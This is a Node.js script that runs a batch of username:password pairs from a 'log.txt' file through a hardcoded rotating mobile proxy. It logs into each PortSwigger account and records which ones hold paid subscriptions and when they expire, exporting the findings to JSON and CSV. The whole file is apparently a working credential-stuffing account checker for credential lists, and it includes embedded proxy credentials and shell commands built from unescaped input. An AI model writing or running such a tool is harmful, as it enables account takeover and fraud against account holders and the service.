#!/usr/bin/env node

/**
 * Batch subscription extractor for all PortSwigger accounts
 * Processes all accounts in log.txt and exports results
 */

const { execSync } = require('child_process');
const fs = require('fs');

const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
const DELAY = 200; // ms between requests (5 req/sec)

// Parse all accounts
const logFile = fs.readFileSync('log.txt', 'utf-8');
const accounts = logFile.split('\n')
    .filter(l => l.trim() && !l.startsWith('#'))
    .map(l => {
        const [username, password] = l.trim().split(':').map(x => x.trim());
        return { username, password };
    });

console.log(`[*] Processing ${accounts.length} accounts\n`);

const results = [];
let processed = 0;
let failed = 0;

// Curl helper
function curl(url, post = null) {
    try {
        let cmd = `curl -s -i -x "${PROXY}" "${url}"`;
        if (post) {
            const data = Object.entries(post).map(([k,v]) => `${k}=${v}`).join('&');
            cmd = `curl -s -i -x "${PROXY}" -X POST -d "${data}" "${url}"`;
        }
        const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 30000 });
        const parts = output.split('\r\n\r\n');
        const body = parts.slice(1).join('\r\n\r\n');
        const status = parseInt(parts[0].match(/HTTP\/\d\.\d (\d+)/)?.[1] || 0);
        const loc = parts[0].match(/[Ll]ocation:\s*([^\r\n]+)/)?.[1]?.trim();
        return { status, body, location: loc };
    } catch (e) {
        return { status: 0, body: '', location: null };
    }
}

// Sleep helper
function sleep(ms) {
    const end = Date.now() + ms;
    while (Date.now() < end) {}
}

// Process single account
function processAccount(account) {
    try {
        // Login
        let r = curl('https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query');
        let state = r.location?.match(/state=([^&]+)/)?.[1] || '';

        const loginData = Object.entries({username: account.username, password: account.password, action:'default'})
            .map(([k,v]) => `${k}=${v}`).join('&');
        const loginCmd = `curl -s -i -x "${PROXY}" -X POST -d "${loginData}" "https://login.portswigger.net/u/login${state ? '?state='+state : ''}"`;

        const loginOutput = execSync(loginCmd, {encoding:'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 30000});
        let url = loginOutput.match(/[Ll]ocation:\s*([^\r\n]+)/)?.[1]?.trim();

        // Follow redirects
        for (let i = 0; i < 15 && url; i++) {
            if (!url.startsWith('http')) url = 'https://login.portswigger.net' + url;
            r = curl(url);
            url = r.location;
            if (url?.includes('portswigger.net') && !url.includes('login')) break;
        }

        // Get subscription data
        r = curl('https://portswigger.net/#/my-account');
        const html = r.body;

        // Parse subscription
        let plan = 'Unknown';
        let subscription = 'unknown';

        if (html.includes('You do not have any subscriptions')) {
            subscription = 'None';
            plan = 'Free/Community';
        } else {
            if (html.toLowerCase().includes('professional')) plan = 'Professional';
            else if (html.toLowerCase().includes('team')) plan = 'Team';
            else if (html.toLowerCase().includes('enterprise')) plan = 'Enterprise';
            else if (html.toLowerCase().includes('community')) plan = 'Community';
            subscription = 'Active';
        }

        // Extract expiry
        const datePattern = /(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4})|(\d{4}[\/\-]\d{1,2}[\/\-]\d{1,2})/g;
        const dates = html.match(datePattern);
        const expiry = dates ? dates[0] : null;

        return {
            username: account.username,
            plan: plan,
            subscription: subscription,
            expiry: expiry,
            status: 'OK'
        };

    } catch (error) {
        return {
            username: account.username,
            plan: 'Unknown',
            subscription: 'Error',
            expiry: null,
            status: 'ERROR: ' + error.message.substring(0, 50)
        };
    }
}

// Process all accounts
console.log('[*] Starting batch extraction...\n');
console.log('Progress: ', '');

for (let i = 0; i < accounts.length; i++) {
    const result = processAccount(accounts[i]);
    results.push(result);

    if (result.status === 'OK') processed++;
    else failed++;

    // Progress indicator
    if ((i + 1) % 10 === 0) {
        process.stdout.write(`${i + 1}/${accounts.length} `);
    }

    sleep(DELAY); // Rate limiting
}

console.log(`\n\n[✓] Completed: ${processed} OK, ${failed} Failed\n`);

// Export JSON
fs.writeFileSync('batch_results.json', JSON.stringify(results, null, 2));
console.log('[✓] Exported: batch_results.json');

// Export CSV
const csv = [
    'Username,Plan,Subscription,Expiry,Status',
    ...results.map(r => `"${r.username}","${r.plan}","${r.subscription}","${r.expiry || ''}","${r.status}"`)
].join('\n');

fs.writeFileSync('batch_results.csv', csv);
console.log('[✓] Exported: batch_results.csv');

// Summary
console.log('\n[=] SUMMARY [=]');
console.log('='.repeat(60));

const byPlan = {};
results.forEach(r => {
    byPlan[r.plan] = (byPlan[r.plan] || 0) + 1;
});

Object.entries(byPlan).forEach(([plan, count]) => {
    console.log(`${plan}: ${count}`);
});

console.log('='.repeat(60));
console.log(`\nTotal accounts: ${results.length}`);
console.log(`Successful: ${processed}`);
console.log(`Failed: ${failed}`);
